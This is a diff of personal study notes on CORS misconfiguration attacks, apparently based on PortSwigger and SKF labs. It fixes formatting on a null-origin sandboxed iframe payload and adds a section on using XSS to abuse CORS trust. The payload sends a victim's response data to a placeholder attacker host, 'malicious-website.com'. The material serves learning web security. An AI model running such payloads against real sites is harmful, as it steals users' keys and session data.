@@ -129,7 +129,7 @@ Access-Control-Allow-Credentials: true
 ```
 - In this situation, an attacker can use various tricks to generate a cross-origin request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
 - ##### [lab](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
-```javascript
+```html
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> 
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -138,7 +138,7 @@ req.send();
 function reqListener() {
 		location='malicious-website.com/log?key='+this.responseText; 
 }; 
-</script>"></iframe>`
+</script>"></iframe>
 ```
 ### [practice in lab](https://skf.gitbook.io/asvs-write-ups/cors-exploitation/cors-exploitation)
 - you can exploit by this codes
@@ -182,7 +182,17 @@ function reqListener() {
 
 <p id="stolenInfo"></p>
 ```
+### Exploiting XSS via CORS trust relationships
+If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
 
+Given the following request:
 
-# after read and practiceing [XSS]
-# That's all, I'll read the rest later.
+`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`
+
+If the server responds with:
+
+`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`
+
+Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:
+
+`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`
